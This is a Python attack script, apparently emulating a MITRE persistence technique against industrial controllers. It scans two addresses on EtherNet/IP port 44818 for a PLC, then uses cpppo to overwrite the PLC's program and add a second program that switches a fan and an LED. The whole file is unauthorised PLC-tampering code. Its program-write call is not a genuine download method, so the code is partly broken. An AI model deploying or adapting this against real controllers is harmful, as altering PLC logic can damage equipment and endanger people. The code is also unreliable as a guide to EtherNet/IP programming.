from cpppo.server.enip import client
import socket
import time

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to modify the program on the PLC
def modify_program():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Define the new program logic
            new_program = """
            // New program logic
            PROGRAM NewProg
                // Rung 1 - TON Timer control for fan activation
                TON_1(
                    IN := START,
                    PT := T#10S
                );
                Activate_FanA := TON_1.Q;
                
                // Rung 2 & 3 - Fan and Green LED control
                IF Activate_FanA THEN
                    _IO_EM_DO_02 := TRUE;  // Fan output
                    _IO_EM_DO_07 := TRUE;  // Green LED
                ELSE
                    _IO_EM_DO_02 := FALSE;
                    _IO_EM_DO_07 := FALSE;
                END_IF;
                
                // Rung 4 - Reset START when fan is active
                IF Activate_FanA THEN
                    START := FALSE;  // Reset operation
                END_IF;
            END_PROGRAM
            """
            
            # Modify the program on the PLC
            # The specific commands to modify the program may vary depending on the PLC model and firmware
            conn.write(['Program'], [new_program])
            print("Program modified on PLC")
    else:
        print("PLC IP address not found")

# Function to add a new program to the PLC
def add_program():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Define the new program logic
            new_program = """
            // New program logic
            PROGRAM NewProg2
                // Rung 1 - TONOFF Timer control for fan activation
                TONOFF_1(
                    IN := START,
                    PT := T#10S,
                    PTOF := T#20S
                );
                Activate_FanA := TONOFF_1.Q;
                
                // Rung 2 & 3 - Fan and Green LED control
                IF Activate_FanA THEN
                    _IO_EM_DO_02 := TRUE;  // Fan output
                    _IO_EM_DO_07 := TRUE;  // Green LED
                ELSE
                    _IO_EM_DO_02 := FALSE;
                    _IO_EM_DO_07 := FALSE;
                END_IF;
            END_PROGRAM
            """
            
            # Add the new program to the PLC
            # The specific commands to add a new program may vary depending on the PLC model and firmware
            conn.write(['Program'], [new_program])
            print("New program added to PLC")
    else:
        print("PLC IP address not found")

# Main function to start the persistence of the MITRE technique
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Modify the program on the PLC
        modify_program()
        
        # Add a new program to the PLC
        add_program()
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()